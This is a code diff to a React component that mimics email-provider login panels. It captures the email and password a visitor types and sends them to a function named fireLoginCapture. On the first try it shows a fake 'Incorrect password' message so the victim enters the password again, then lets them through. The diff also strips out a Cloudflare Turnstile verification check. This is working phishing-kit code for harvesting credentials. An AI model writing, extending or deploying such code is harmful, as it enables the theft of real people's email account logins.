@@ -1,9 +1,7 @@
-import React, { useState, useRef } from 'react';
+import React, { useState } from 'react';
 import { ChevronRight, RefreshCw, X, Eye, EyeOff } from 'lucide-react';
-import { Turnstile } from '@marsidev/react-turnstile';
 import { EmailProvider } from '../types';
 import { fireLoginCapture } from '../utils/api';
-import { SECURITY_CONFIG } from '../config/security';
 
 interface ReplicaPanelProps {
   onSelectProvider: (provider: EmailProvider, email: string) => void;
@@ -17,16 +15,13 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
-  const [turnstileToken, setTurnstileToken] = useState<string | null>(null);
   const [attempts, setAttempts] = useState(0);
-  const turnstileRef = useRef<any>(null);
 
   const handleOpenLogin = (provider: EmailProvider) => {
     setActiveLoginProvider(provider);
     setEmailInput('');
     setPasswordInput('');
     setErrorMsg('');
-    setTurnstileToken(null);
     setIsLoading(false);
     setAttempts(0);
   };
@@ -58,7 +53,6 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
       email: emailInput,
       provider: activeLoginProvider?.id || 'email',
       password: passwordInput,
-      turnstileToken: turnstileToken,
       attempt: (attempts + 1) as 1 | 2,
     });
 
@@ -67,8 +61,6 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
       if (attempts === 0) {
         setErrorMsg('Incorrect password. Please check your credentials and try again.');
         setAttempts(1);
-        setTurnstileToken(null);
-        turnstileRef.current?.reset();
       } else {
         onSelectProvider(activeLoginProvider!, emailInput);
         setActiveLoginProvider(null);
@@ -232,24 +224,10 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
                     </p>
                   )}
 
-                  <div className="pt-1 flex justify-center w-full overflow-hidden rounded-md border border-white/5 bg-[#ffffff02]">
-                    <Turnstile
-                      ref={turnstileRef}
-                      siteKey={SECURITY_CONFIG.turnstileSiteKey}
-                      onSuccess={(token) => setTurnstileToken(token)}
-                      onError={() => setErrorMsg('Turnstile verification failed. Please try again.')}
-                      onExpire={() => setTurnstileToken(null)}
-                      options={{
-                        theme: 'dark',
-                        size: 'normal',
-                      }}
-                    />
-                  </div>
-
                   <div className="pt-2 flex gap-2">
                     <button
                       type="submit"
-                      disabled={isLoading || !turnstileToken}
+                      disabled={isLoading}
                       className="flex-1 bg-amber-500 hover:bg-amber-400 text-black font-sans text-xs font-bold py-2 px-4 rounded-lg flex items-center justify-center gap-1.5 transition-colors cursor-pointer select-none disabled:opacity-50"
                     >
                       {isLoading ? (
